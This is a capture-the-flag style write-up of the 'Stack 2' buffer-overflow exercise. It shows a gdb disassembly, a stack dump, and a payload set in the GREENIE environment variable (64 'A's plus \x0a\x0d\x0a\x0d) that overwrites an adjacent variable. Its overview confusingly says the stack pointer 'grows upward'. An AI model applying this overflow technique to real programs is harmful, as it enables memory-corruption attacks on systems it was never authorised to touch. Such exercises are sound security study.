# Stack 2
## Overview
    The variable gets its value from the environment variable GREENIE instead
    of a command line parameter and buffer[64] copy the value of variable.
    The esp(current stack pointer) grows upward when allocating memory
    and the higher the esp goes, it points to smaller address number.
    Thus, we should first modify the environment variable to a very large 
    value with 0x0d0a0d0a as postfix to overwrite buffer[64] and modified.

## Process
    $ export GREENIE=`python -c "print 'A'*64"`
    $ env | grep GREENIE
    GREENIE=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    $ gdb -q ./Stack2
    (gdb) disas main
        Dump of assembler code for function main:
            0x08048494 <+0>:     push   %ebp
            0x08048495 <+1>:     mov    %esp,%ebp
            0x08048497 <+3>:     and    $0xfffffff0,%esp
            0x0804849a <+6>:     sub    $0x60,%esp
            0x0804849d <+9>:     movl   $0x80485e0,(%esp)
            0x080484a4 <+16>:    call   0x804837c <getenv@plt>
            0x080484a9 <+21>:    mov    %eax,0x5c(%esp)
            0x080484ad <+25>:    cmpl   $0x0,0x5c(%esp)
            0x080484b2 <+30>:    jne    0x80484c8 <main+52>
            0x080484b4 <+32>:    movl   $0x80485e8,0x4(%esp)
            0x080484bc <+40>:    movl   $0x1,(%esp)
            0x080484c3 <+47>:    call   0x80483bc <errx@plt>
            0x080484c8 <+52>:    movl   $0x0,0x58(%esp)
            0x080484d0 <+60>:    mov    0x5c(%esp),%eax
            0x080484d4 <+64>:    mov    %eax,0x4(%esp)
            0x080484d8 <+68>:    lea    0x18(%esp),%eax
            0x080484dc <+72>:    mov    %eax,(%esp)
            0x080484df <+75>:    call   0x804839c <strcpy@plt>
            0x080484e4 <+80>:    mov    0x58(%esp),%eax
            0x080484e8 <+84>:    cmp    $0xd0a0d0a,%eax
            0x080484ed <+89>:    jne    0x80484fd <main+105>
            0x080484ef <+91>:    movl   $0x8048618,(%esp)
            0x080484f6 <+98>:    call   0x80483cc <puts@plt>
            0x080484fb <+103>:   jmp    0x8048512 <main+126>
            0x080484fd <+105>:   mov    0x58(%esp),%edx
            0x08048501 <+109>:   mov    $0x8048641,%eax
            0x08048506 <+114>:   mov    %edx,0x4(%esp)
            0x0804850a <+118>:   mov    %eax,(%esp)
            0x0804850d <+121>:   call   0x80483ac <printf@plt>
            0x08048512 <+126>:   leave
            0x08048513 <+127>:  ret
        End of assembler dump.
    (gdb) b *main+84
    Breakpoint 1 at 0x80484e8: file stack2/stack2.c, line 22.
    (gdb) x/60x $esp
        0xffffd530: 0xffffd548  0xffffdea9  0xf7fb8000  0x0000cd57
        0xffffd540: 0xffffffff  0x0000002f  0x41414141  0x41414141
        0xffffd550: 0x41414141  0x41414141  0x41414141  0x41414141
        0xffffd560: 0x41414141  0x41414141  0x41414141  0x41414141
        0xffffd570: 0x41414141  0x41414141  0x41414141  0x41414141
        0xffffd580: 0x41414141  0x41414141  0x00000000  0xffffdea9
        0xffffd590: 0xf7fb8000  0xf7fb8000  0x00000000  0xf7e1e637
        0xffffd5a0: 0x00000001  0xffffd634  0xffffd63c  0x00000000
        0xffffd5b0: 0x00000000  0x00000000  0xf7fb8000  0xf7ffdc04
        0xffffd5c0: 0xf7ffd000  0x00000000  0xf7fb8000  0xf7fb8000
        0xffffd5d0: 0x00000000  0xee5ca7c2  0xd23c09d2  0x00000000
        0xffffd5e0: 0x00000000  0x00000000  0x00000001  0x080483e0
        0xffffd5f0: 0x00000000  0xf7fedf10  0xf7fe8780  0xf7ffd000
        0xffffd600: 0x00000001  0x080483e0  0x00000000  0x08048401
        0xffffd610: 0x08048494  0x00000001  0xffffd634  0x08048530
    
## Method
    Use 64 bytes to overwrite buffer[64] and little endian of 0x0d0a0d0a 
    (\x0a\x0d\x0a\x0d) to overwrite modified.
    So we need to set environment variable to 64 bytes A + \x0a\x0d\x0a\x0d.
## Answer
    $ export GREENIE=`python -c "print 'A'*64+'\x0a\x0d\x0a\x0d'"`
    $ env | grep GREENIE
    GREENIE=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    $ ./stack2
    you have correctly modified the variable

    
